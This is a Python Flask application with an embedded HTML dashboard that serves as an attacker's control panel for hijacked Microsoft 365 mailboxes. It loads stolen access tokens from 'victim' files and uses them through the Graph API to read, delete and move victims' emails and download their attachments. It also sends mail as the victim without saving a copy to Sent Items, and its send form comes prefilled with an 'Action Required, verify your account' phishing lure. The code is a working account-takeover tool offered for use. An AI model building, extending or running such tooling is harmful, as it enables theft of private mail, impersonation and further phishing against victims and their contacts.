from flask import Flask, render_template_string, request, jsonify, send_file
import requests
import json
import os
from datetime import datetime
from dotenv import load_dotenv
from concurrent.futures import ThreadPoolExecutor
import io
import redis

redis_url = os.getenv("REDIS_URL", "redis://localhost:6379/0")
r = redis.from_url(redis_url)
r.ping()

load_dotenv()

app = Flask(__name__)
BACKEND_URL = os.getenv("BACKEND_URL", "http://localhost:5000")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Store active victim tokens/sessions
victims = {}
tokens = {}
executor = ThreadPoolExecutor(max_workers=20)




def load_victims():
    """Load victim data from Redis + victim JSON files"""
    victims.clear()
    tokens.clear()
    
    # Load victim files 
    victim_files = [f for f in os.listdir(".") if f.startswith("victim_") and f.endswith(".json")]
    
    for filename in victim_files:
        try:
            filepath = filename
            with open(filepath, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            email = data['profile'].get('mail') or data['profile'].get('userPrincipalName', 'unknown')
            display_name = data['profile'].get('displayName', 'Unknown')
            
            token = data.get('tokens', {}).get('access_token')
            if token and isinstance(token, str) and len(token) > 500:
                tokens[email] = token
            
            victims[email] = {
                'id': display_name,
                'email': email,
                'filename': filename,
                'profile': data['profile'],
                'last_seen': datetime.now().isoformat(),
                'email_count': data.get('mailbox', {}).get('totalItemCount', 0),
                'token_status': '✅ Ready' if token else '❌ No Token',
                'file_size': os.path.getsize(filepath)
            }
        except:
            continue
    
    print(f"📊 Loaded {len(victims)} victims from files")
    return len(victims)

def api_call(email, endpoint, method='GET', data=None, headers=None):
    """Make authenticated Graph API call for victim"""
    token = tokens.get(email)
    print(f"🔍 DEBUG {email}: token len={len(token) if token else 'None'}, starts='{token[:20] if token else ''}...', has_dots={'.' in (token or '')}")
    if not token:
        return None, "No valid token - refresh victim data"
    
    auth_headers = {"Authorization": f"Bearer {token}"}
    print(f"📤 SENDING {email} -> {endpoint}: Bearer {token[:50]}...")
    if headers:
        auth_headers.update(headers)
    
    url = f"https://graph.microsoft.com/v1.0/{endpoint}"
    
    try:
        if method.upper() == 'GET':
            resp = requests.get(url, headers=auth_headers, timeout=20)
        elif method.upper() == 'POST':
            resp = requests.post(url, headers={**auth_headers, **{"Content-Type": "application/json"}}, 
                               json=data, timeout=20)
        elif method.upper() == 'PATCH':
            resp = requests.patch(url, headers={**auth_headers, **{"Content-Type": "application/json"}}, 
                                json=data, timeout=20)
        elif method.upper() == 'DELETE':
            resp = requests.delete(url, headers=auth_headers, timeout=20)
        else:
            return None, "Invalid method"
            
        if resp.status_code in [200, 201, 202]:
            try:
                return resp.json(), None
            except:
                return {'raw': resp.text[:500]}, None
        else:
         print(f"📥 {email} {endpoint}: {resp.status_code} '{resp.text[:100]}'"); data, error = None, f"HTTP {resp.status_code}: {resp.text[:200]}"; return data, error
    
            
    except requests.exceptions.Timeout:
        return None, "API timeout - token may be expired"
    except Exception as e:
        return None, f"Error: {str(e)}"

@app.route('/')
def dashboard():
    count = load_victims()
    return render_template_string(DASHBOARD_HTML, victims=victims, count=count)

@app.route('/api/victims')
def api_victims():
    load_victims()
    return jsonify(list(victims.values()))

@app.route('/api/victim/<email>/emails')
def api_emails(email):
   def fetch_emails():
        all_emails = []
        url = "me/messages?$select=id,subject,from,receivedDateTime,isRead,bodyPreview&$orderby=receivedDateTime desc&$top=50"
        
        while url and len(all_emails) < 50:
            data, error = api_call(email, url)
            if error:
                return {'data': None, 'error': error}
            
            all_emails.extend(data.get('value', []))
            url = data.get('@odata.nextLink')
            if url:
                url = url.replace("https://graph.microsoft.com/v1.0/", "")
        
        return {'data': {'value': all_emails[:50]}, 'error': None}


   future = executor.submit(fetch_emails)
   try:
        result = future.result(timeout=45)
        return jsonify(result)
   except:
        return jsonify({'error': 'Request timeout'})

@app.route('/api/victim/<email>/send', methods=['POST'])
def api_send_email(email):
    data = request.json or {}
    to_emails = [e.strip() for e in (data.get('to', '') or '').split(',') if e.strip()]
    
    if not to_emails:
        return jsonify({'success': False, 'error': 'No recipients specified'})

    msg_data = {
        "message": {
            "subject": data.get('subject', '[No Subject]'),
            "body": {"contentType": "HTML", "content": data.get('html', '<p>Empty message</p>')},
            "toRecipients": [{"emailAddress": {"address": e}} for e in to_emails]
        },
        "saveToSentItems": "false"
    }

    result, error = api_call(email, "me/sendMail", 'POST', msg_data)
    if error:
        return jsonify({'success': False, 'error': error})
    return jsonify({'success': True, 'message': 'Email sent successfully'})

@app.route('/api/victim/<email>/read/<msg_id>')
def api_read_email(email, msg_id):
    data, error = api_call(email, f"me/messages/{msg_id}?$expand=attachments")
    return jsonify({'data': data, 'error': error})

@app.route('/api/victim/<email>/mark_read/<msg_id>', methods=['POST'])
def api_mark_read(email, msg_id):
    data, error = api_call(email, f"me/messages/{msg_id}", 'PATCH', {"isRead": True})
    return jsonify({'success': error is None, 'error': error})

@app.route('/api/victim/<email>/mark_unread/<msg_id>', methods=['POST'])
def api_mark_unread(email, msg_id):
    data, error = api_call(email, f"me/messages/{msg_id}", 'PATCH', {"isRead": False})
    return jsonify({'success': error is None, 'error': error})

@app.route('/api/victim/<email>/delete/<msg_id>', methods=['POST'])
def api_delete_email(email, msg_id):
    data, error = api_call(email, f"me/messages/{msg_id}", 'DELETE')
    return jsonify({'success': error is None, 'error': error})

@app.route('/api/victim/<email>/move/<msg_id>', methods=['POST'])
def api_move_email(email, msg_id):
    data = request.json or {}
    folder_id = data.get('folderId')
    if not folder_id:
        return jsonify({'success': False, 'error': 'folderId required'})
    
    result, error = api_call(email, f"me/messages/{msg_id}/move", 'POST', {'destinationId': folder_id})
    return jsonify({'success': error is None, 'error': error})

@app.route('/api/victim/<email>/folders')
def api_folders(email):
    data, error = api_call(email, "me/mailFolders?$select=id,displayName,totalItemCount")
    return jsonify({'data': data, 'error': error})

@app.route('/api/victim/<email>/emails/<folder_id>')
def api_folder_emails(email, folder_id):

    all_emails = []
    url = f"me/mailFolders/{folder_id}/messages?$select=id,subject,from,receivedDateTime,isRead,bodyPreview&$orderby=receivedDateTime desc&$top=50"

    while url and len(all_emails) < 50:
        data, error = api_call(email, url)
        if error:
            return jsonify({'data': None, 'error': error})

        all_emails.extend(data.get('value', []))

        # move to next page if exists
        url = data.get('@odata.nextLink')
        if url:
            url = url.replace("https://graph.microsoft.com/v1.0/", "")

    return jsonify({'data': {'value': all_emails}, 'error': None})

@app.route('/api/victim/<email>/download/<msg_id>/<attach_id>')
def api_download_attachment(email, msg_id, attach_id):
    data, error = api_call(email, f"me/messages/{msg_id}/attachments/{attach_id}/$value", 'GET', None, {'Accept': 'application/octet-stream'})
    if error:
        return jsonify({'error': error})
    
    try:
        return send_file(
            io.BytesIO(data.content),
            mimetype=data.headers.get('content-type', 'application/octet-stream'),
            as_attachment=True,
            download_name=f"attachment_{attach_id}"
        )
    except:
        return jsonify({'error': 'Download failed'})

@app.route('/api/refresh_all')
def api_refresh_all():
    count = load_victims()
    return jsonify({'refreshed': count, 'victims': len(victims)})

DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <title>📧 Email Control Center</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: linear-gradient(135deg, white 50%, red 50%, white 50%);
            color: black; min-height: 100vh;
        }
        .header { 
            background: red 50% ; backdrop-filter: blur(20px); 
            padding: 1.5rem 2rem; border-bottom: 1px grey;
            position: sticky; top: 0; z-index: 100;
        }
        .header h1 { font-size: 1.8rem; font-weight: 700; margin-bottom: 1rem; }
        .stats { display: flex; gap: 1rem; margin-bottom: 1rem; }
        .stat-card { 
            background: white; padding: 0.75rem 1.25rem; 
            border-radius: 12px; border: 1px white;
            font-size: 0.95rem; font-weight: 600;
        }
        .btn { 
            padding: 0.75rem 1.5rem; border: none; border-radius: 10px; 
            font-weight: 600; cursor: pointer; transition: all 0.2s; 
            font-size: 0.9rem; text-decoration: none; display: inline-flex; 
            align-items: center; gap: 0.5rem;
        }
        .btn-primary { background: white; color: red; }
        .btn-success { background: linear-gradient(135deg, grey, #059669); color: white; }
        .btn-danger { background: linear-gradient(135deg, #ef4444, #dc2626); color: white; }
        .btn-warning { background: linear-gradient(135deg, #f59e0b, #d97706); color: white; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px white; }
        .container { max-width: 1400px; margin: 0 auto; padding: 2rem; }
        .victims-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 1.5rem; }
        .victim-card { 
            background: red; backdrop-filter: blur(15px); 
            border-radius: 20px; padding: 1.5rem; border: 1px grey;
            transition: all 0.3s; position: relative; overflow: hidden;
        }
        .victim-card:hover { transform: translateY(-5px); box-shadow: 0 20px 40px rgba(0,0,0,0.3); }
        .victim-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 1rem; }
        .email { font-size: 1.1rem; font-weight: 700; color: white; margin-bottom: 0.25rem; }
        .name { color: white; font-size: 0.9rem; }
        .status { padding: 0.25rem 0.75rem; border-radius: 20px; font-size: 0.8rem; font-weight: 600; }
        .status.online { background: white; color: green; border: 1px solid black; }
        .status.warning { background: rgba(245,158,11,0.2); color: #f59e0b; border: 1px solid rgba(245,158,11,0.3); }
        .meta { font-size: 0.85rem; color: white; margin-bottom: 1rem; }
        .controls { display: flex; gap: 0.75rem; }
        .section { display: none; animation: fadeIn 0.3s; }
        .section.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .email-panel { display: grid; grid-template-columns: 300px 1fr; gap: 1.5rem; height: calc(100vh - 200px); }
        .folder-panel { background: white; border-radius: 16px; padding: 1.5rem; }
        .folder-list { list-style: none; }
        .folder-item { padding: 0.75rem; margin-bottom: 0.5rem; border-radius: 10px; cursor: pointer; transition: all 0.2s; }
        .folder-item:hover, .folder-item.active { background: red; color: white; }
        .emails-list { background: white; border-radius: 16px; overflow: hidden; display: flex; flex-direction: column; }
        .email-item { padding: 1rem; border-bottom: 1px solid red; cursor: pointer; transition: all 0.2s; }
        .email-item:hover { background: red; }
        .email-item.unread { font-weight: 600; background: red; }
        .email-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 0.5rem; }
        .email-meta { font-size: 0.85rem; color: white; }
        .email-content { font-size: 0.9rem; line-height: 1.5; color: white; }
        .email-actions { display: flex; gap: 0.5rem; margin-top: 0.75rem; }
        .email-detail { flex: 1; padding: 2rem; background: red; border-radius: 16px; }
        .attachments { margin-top: 1rem; }
        .attachment { display: inline-block; background: red; padding: 0.5rem 1rem; 
                      border-radius: 8px; margin-right: 0.5rem; margin-bottom: 0.5rem; cursor: pointer; }
        .send-form { background: red; border-radius: 16px; padding: 2rem; max-width: 800px; margin: 0 auto; }
        .form-group { margin-bottom: 1.5rem; }
        .form-group label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: white; }
        .form-group input, .form-group textarea { 
            width: 100%; padding: 0.875rem; border: 1px white; 
            border-radius: 12px; background: white; color: purple; 
            font-size: 0.95rem; font-family: inherit;
        }
        .form-group textarea { resize: vertical; min-height: 120px; }
        .back-btn { background: red; color: white; margin-bottom: 1rem; }
        .loading { opacity: 0.6; pointer-events: none; }
        @media (max-width: 768px) { .email-panel { grid-template-columns: 1fr; } .victims-grid { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
    <div class="header">
        <div style="display: flex; justify-content: space-between; align-items: center;">
            <div>
                <h1>📧</h1>
                <div class="stats">
                    <div class="stat-card"><strong id="victim-count">{{ count }}</strong><br>Active Tokens</div>
                    <div class="stat-card"><strong id="total-emails">0</strong><br>Emails Indexed</div>
                </div>
            </div>
            <button class="btn btn-primary" onclick="refreshAll()">🔄 Refresh Data</button>
        </div>
    </div>
    
    <div class="container">
        <!-- Victims Grid -->
        <div id="victims-section" class="section active">
            <div class="victims-grid" id="victims-grid">
                {% if victims %}
                    {% for email, victim in victims.items() %}
                    <div class="victim-card" data-email="{{ email }}">
                        <div class="victim-header">
                            <div>
                                <div class="email">{{ victim.email }}</div>
                                <div class="name">{{ victim.id }}</div>
                            </div>
                            <span class="status {{ 'online' if '✅' in victim.token_status else 'warning' }}">{{ victim.token_status }}</span>
                        </div>
                        <div class="meta">{{ victim.email_count }} emails • {{ victim.filename }} • {{ victim.file_size|filesizeformat }} • Token preview: {{ victim.profile.get("mail", "")[:20] }}...</div>
                        <div class="controls">
                            <button class="btn btn-primary" onclick="showEmailPanel('{{ email }}')">📧 Email Manager</button>
                            <button class="btn btn-success" onclick="showSendForm('{{ email }}')">✉️ Quick Send</button>
                        </div>
                    </div>
                    {% endfor %}
                {% else %}
                    <div style="grid-column: 1/-1; text-align: center; padding: 4rem 2rem; color: #64748b;">
                        <h3>📭 No active tokens found</h3>
                        <p>Waiting for victim authentication data...</p>
                        <button class="btn btn-primary" onclick="refreshAll()" style="margin-top: 1rem;">🔍 Scan Again</button>
                    </div>
                {% endif %}
            </div>
        </div>

        <!-- Email Management Panel -->
        <div id="email-panel" class="section">
            <button class="btn back-btn" onclick="showVictims()">← Back to Victims</button>
            <div class="email-panel">
                <div class="folder-panel">
                    <h4 style="margin-bottom: 1rem; color: #f1f5f9;">📁 Folders</h4>
                    <ul class="folder-list" id="folder-list"></ul>
                </div>
                <div class="emails-list">
                    <div id="emails-list" style="flex: 1; overflow-y: auto;"></div>
                    <div id="email-detail" style="border-top: 1px solid rgba(255,255,255,0.05); padding: 0;"></div>
                </div>
            </div>
        </div>

        <!-- Send Email Form -->
        <div id="send-section" class="section">
            <button class="btn back-btn" onclick="showVictims()">← Back to Victims</button>
            <div class="send-form">
                <h3 id="send-title">Send Email</h3>
                <form id="send-form">
                    <div class="form-group">
                        <label>To (comma separated):</label>
                        <input type="text" id="to-emails" placeholder="victim@company.com, boss@company.com">
                    </div>
                    <div class="form-group">
                        <label>Subject:</label>
                        <input type="text" id="email-subject" placeholder="Important: Action Required">
                    </div>
                    <div class="form-group">
                        <label>Message (HTML):</label>
                        <textarea id="email-body" placeholder="<h2>Dear User,</h2><p>Please review the attached documents...</p>"><h2>Action Required</h2><p>Click <a href="#">here</a> to verify your account.</p></textarea>
                        <div id="email-preview" style="border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; padding: 1rem; margin-top: 0.5rem; background: rgba(40,40,60,0.5); max-height: 200px; overflow-y: auto; font-size: 0.9rem;"></div>
                    </div>
                    <div style="display: flex; gap: 1rem;">
                        <button type="submit" class="btn btn-success">🚀 Send Email</button>
                        <button type="button" class="btn btn-warning" onclick="showVictims()">Cancel</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script>
    let currentEmail = null;
    let currentFolderId = 'inbox';

    // Format filesize
    function filesizeformat(bytes) {
        if (bytes === 0) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }

    function refreshAll() {
        document.body.classList.add('loading');
        fetch('/api/refresh_all').then(() => location.reload());
    }

    function showVictims() {
        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
        document.getElementById('victims-section').classList.add('active');
    }

    function showEmailPanel(email) {
        currentEmail = email;
        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
        document.getElementById('email-panel').classList.add('active');
        loadFolders(email);
        loadEmails(email);
        document.getElementById('email-detail').innerHTML = '';
    }

    function showSendForm(email) {
        currentEmail = email;
        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
        document.getElementById('send-section').classList.add('active');
        document.getElementById('send-title').textContent = `Send from ${email}`;
    }

    async function loadFolders(email) {
        const res = await fetch(`/api/victim/${email}/folders`);
        const { data, error } = await res.json();
        if (error) {
            document.getElementById('folder-list').innerHTML = '<li style="color:#ef4444;">❌ ' + error + '</li>';
            console.error('Folders error:', error);
            return;
        }
        
        const folderList = document.getElementById('folder-list');
        folderList.innerHTML = '';
        
        (data?.value || []).forEach(folder => {
            const li = document.createElement('li');
            li.className = `folder-item ${folder.id === 'inbox' ? 'active' : ''}`;
            li.innerHTML = `<strong>${folder.displayName}</strong> <span style="color:#94a3b8;font-size:0.8rem;">(${folder.totalItemCount})</span>`;
            li.onclick = () => loadFolderEmails(email, folder.id, li);
            folderList.appendChild(li);
        });
    }

    async function loadEmails(email, folderId = 'inbox') {
        document.body.classList.add('loading');
        const res = await fetch(folderId === 'inbox' ? 
            `/api/victim/${email}/emails` : `/api/victim/${email}/emails/${folderId}`);
        const { data, error } = await res.json();
        
        document.body.classList.remove('loading');
        
        const emailsList = document.getElementById('emails-list');
        emailsList.innerHTML = '';
        
        if (error) {
            emailsList.innerHTML = '<div style="padding:1rem;color:#ef4444;">❌ ' + error + '</div>';
            console.error('Emails error:', error);
            return;
        }
        
        if (data?.value && data.value.length === 50) {
            const moreBtn = document.createElement('div');
            moreBtn.innerHTML = '<div style="padding:1rem;text-align:center;color:#94a3b8;">📄 Showing first 50 emails • Full scan available on demand</div>';
            emailsList.appendChild(moreBtn);
        }
        
        
        (data?.value || []).forEach(email => {
            const div = document.createElement('div');
            div.className = `email-item ${!email.isRead ? 'unread' : ''}`;
            div.innerHTML = `
                <div class="email-header">
                    <div>
                        <div style="font-weight: 600; margin-bottom: 0.25rem;">${email.subject || '[No Subject]'}</div>
                        <div class="email-meta">From: ${email.from?.emailAddress?.address || 'Unknown'} • ${new Date(email.receivedDateTime).toLocaleString()}</div>
                    </div>
                    <div style="font-size: 0.8rem; color: #94a3b8;">${email.bodyPreview?.substring(0, 100) || ''}...</div>
                </div>
                <div class="email-actions" style="opacity: 0; transition: opacity 0.2s;">
                    <button class="btn" style="padding: 0.25rem 0.5rem; font-size: 0.75rem;" onclick="markRead('${email.id}', event)">✓</button>
                    <button class="btn btn-danger" style="padding: 0.25rem 0.5rem; font-size: 0.75rem;" onclick="deleteEmail('${email.id}', event)">🗑️</button>
                </div>
            `;
            div.onclick = (e) => {
                if (!e.target.closest('.email-actions')) loadEmailDetail(email.id);
            };
            emailsList.appendChild(div);
        });
    }
    async function loadFolderEmails(email, folderId, li) {
        currentFolderId = folderId;
        await loadEmails(email, folderId);
    
        document.querySelectorAll('.folder-item').forEach(f => f.classList.remove('active'));
        li.classList.add('active');
    }

    async function loadEmailDetail(msgId) {
        const res = await fetch(`/api/victim/${currentEmail}/read/${msgId}`);
        const { data, error } = await res.json();
        if (error) {
            document.getElementById('email-detail').innerHTML = '<div style="padding:2rem;color:#ef4444;">❌ ' + error + '</div>';
            console.error('Email detail error:', error);
            return;
        }
        
        const detail = document.getElementById('email-detail');
        const email = data;
        
        const attachments = email.attachments?.value || [];
        const attachHtml = attachments.map(a => 
            `<a href="/api/victim/${currentEmail}/download/${msgId}/${a.id}" class="attachment" target="_blank">📎 ${a.name} (${(a.size/1024).toFixed(1)}KB)</a>`
        ).join('');
        
        detail.innerHTML = `
            <div style="font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem;">${email.subject || '[No Subject]'}</div>
            <div style="color: #94a3b8; margin-bottom: 1.5rem; font-size: 0.9rem;">
                From: ${email.from?.emailAddress?.address || 'Unknown'} • 
                ${new Date(email.receivedDateTime).toLocaleString()}
            </div>
             
            <div style="line-height: 1.6; margin-bottom: 1.5rem; white-space: pre-wrap;">
                ${email.body?.content || email.bodyPreview || 'No content'}
            </div>

            ${attachHtml ? `<div class="attachments">${attachHtml}</div>` : ''}
            <div class="email-actions" style="justify-content: flex-end;">
                <button class="btn btn-primary" onclick="markRead('${msgId}')">Mark Read</button>
                <button class="btn btn-warning" onclick="markUnread('${msgId}')">Mark Unread</button>
                <button class="btn btn-danger" onclick="deleteEmail('${msgId}')">Delete</button>
            </div>
        `;
    }

    async function markRead(msgId, event) {
        if (event) event.stopPropagation();
        await fetch(`/api/victim/${currentEmail}/mark_read/${msgId}`, {method: 'POST'});
        loadEmails(currentEmail, currentFolderId);
    }

    async function markUnread(msgId) {
        await fetch(`/api/victim/${currentEmail}/mark_unread/${msgId}`, {method: 'POST'});
        loadEmails(currentEmail, currentFolderId);
    }

    async function deleteEmail(msgId, event) {
        if (event) event.stopPropagation();
        if (!confirm('Delete this email?')) return;
        await fetch(`/api/victim/${currentEmail}/delete/${msgId}`, {method: 'POST'});
        loadEmails(currentEmail, currentFolderId);
    }

    document.getElementById('send-form').onsubmit = async (e) => {
        e.preventDefault();

        const htmlContent = document.getElementById('email-body').value;
        document.getElementById('email-preview').innerHTML = htmlContent;
        const formData = {
            to: document.getElementById('to-emails').value,
            subject: document.getElementById('email-subject').value,
            html: htmlContent 
            
    };

        const res = await fetch(`/api/victim/${currentEmail}/send`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(formData)
        });
        const result = await res.json();
        
        if (result.success) {
            alert('✅ Email sent successfully!');
            showVictims();
        } else {
            alert('❌ Failed to send: ' + (result.error || 'Unknown error'));
        }
    };

    
    // LIVE PREVIEW
    document.getElementById('email-body').addEventListener('input', function () {
    document.getElementById('email-preview').innerHTML = this.value;
    });


   // Auto-refresh every 90s (reduced overlap)
    setInterval(() => {
        if (document.visibilityState === 'visible' && 
            !document.body.classList.contains('loading')) {
            fetch('/api/victims').then(res => res.json()).then(vics => {
                document.getElementById('victim-count').textContent = vics.length;
            }).catch(() => {}); // silent fail
        }
    }, 90000);
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    print("🚀 Email Control Center: http://0.0.0.0:8080")
    print("✅ Full email management: Read/Write/Send/Delete/Move + Attachments + Folders")
    app.run(host='0.0.0.0', port=8080, debug=False)